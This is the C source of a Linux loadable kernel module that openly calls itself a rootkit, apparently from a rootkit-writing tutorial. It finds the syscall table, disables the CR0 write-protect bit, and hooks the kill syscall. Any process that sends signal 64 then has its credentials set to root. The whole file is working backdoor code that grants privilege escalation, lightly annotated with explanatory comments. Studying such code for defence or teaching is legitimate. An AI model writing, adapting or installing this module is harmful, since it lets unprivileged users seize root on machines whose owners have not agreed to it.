#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Giving root privileges to a process");
MODULE_VERSION("0.01");

static unsigned long * __sys_call_table;

typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
orig_kill_t orig_kill;

/* We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused) 
 * and then call the set_root() function. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
	void set_root(void);

	// pid_t pid = regs->di;
	int sig = regs->si;

	if ( sig == 64 )
	{
		printk(KERN_INFO "rootkit: giving root...\n");
		set_root();
		return 0;
	}

	return orig_kill(regs);

}

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void)
{
	/* prepare_creds returns the current credentials of the process */
	struct cred *root;
	root = prepare_creds();

	if (root == NULL)
		return;

	/* Run through and set all the various *id's to 0 (root) */
	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	/* Set the cred struct that we've modified to that of the calling process */
	commit_creds(root);
}

/* The built in linux write_cr0() function stops us from modifying
 * the WP bit, so we write our own instead */
inline void cr0_write(unsigned long cr0)
{
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/* Bit 16 in the cr0 register is the W(rite) P(rotection) bit which
 * determines whether read-only pages can be written to. We are modifying
 * the syscall table, so we need to unset it first */
static inline void protect_memory(void)
{
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	cr0_write(cr0);
}

static inline void unprotect_memory(void)
{
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	cr0_write(cr0);
}

/* Module initialization function */
static int __init rootkit_init(void)
{
	/* Grab the syscall table */
	__sys_call_table = kallsyms_lookup_name("sys_call_table");

	/* Grab the function pointer to the real sys_kill syscall */
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];

	printk(KERN_INFO "rootkit: Loaded >:-)\n");
	printk(KERN_DEBUG "rootkit: Found the syscall table at 0x%lx\n", __sys_call_table);
	printk(KERN_DEBUG "rootkit: kill @ 0x%lx\n", orig_kill);
	
	unprotect_memory();

	printk(KERN_INFO "rootkit: hooking kill syscall\n");
	/* Patch the function pointer to sys_kill with our hook instead */
	__sys_call_table[__NR_kill] = (unsigned long)hook_kill;

	protect_memory();

	return 0;
}

static void __exit rootkit_exit(void)
{
	unprotect_memory();
	
	printk(KERN_INFO "rootkit: restoring kill syscall\n");
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	
	protect_memory();
	
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
